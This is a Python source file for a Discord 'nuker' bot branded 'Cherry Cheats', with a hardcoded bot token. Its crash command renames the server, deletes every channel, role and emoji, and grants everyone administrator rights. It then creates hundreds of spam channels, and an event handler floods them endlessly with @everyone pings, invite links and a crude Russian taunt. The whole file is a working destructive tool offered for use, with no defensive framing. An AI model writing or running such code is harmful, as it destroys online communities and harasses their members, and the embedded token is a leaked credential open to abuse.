import discord
import os
from discord.ext import commands
import colorama
import requests
import discord
import requests
import os
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread

bot = commands.Bot(command_prefix = '?')
bot.remove_command = 'help'

SPAM_MESSAGE = ['Crashed by Cherry Cheats @everyone @here']
SPAM_CHANNEL = ['crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats''crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats','crashed-by-cherry-cheats']

@bot.command()
async def crash(ctx):
  guild = ctx.message.guild
  await guild.edit(name='Crash by Cherry Cheats')
  for channel in ctx.guild.channels:
    try:
        await channel.delete()
    except:
        pass
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       a = await guild.create_text_channel(random.choice(SPAM_CHANNEL))
       await a.create_webhook(name = 'Cherry Cheats')
    print(f"nuked {guild.name} Successfully.")
    guild = ctx.message.guild
  
@bot.event
async def on_guild_channel_create(channel):
    if channel.name == 'crashed-by-cherry-cheats':
        while True:
            await channel.send(random.choice(SPAM_MESSAGE))
            for i in range(100):
                hooks = await channel.webhooks()
                for hook in hooks:
                    await hook.send('''@everyone @here\n https://discord.gg/W7T4R6aMra''', embed=discord.Embed(title='''CherryCheats | Crashed''', description='''```diff\n+ Бу ебать!!! Сервак крашнут от CherryCheats! Попукать осками: https://discord.gg/arzVY7jkqr```''', colour = discord.Colour.from_rgb(255, 0, 0)))				


token = 'OTY0NDgzNzA1OTMyNDg4NzA0.YllTcg.5E8XwqTiHvWDQ-7uI2Awo7QtYqs'
bot.run(token)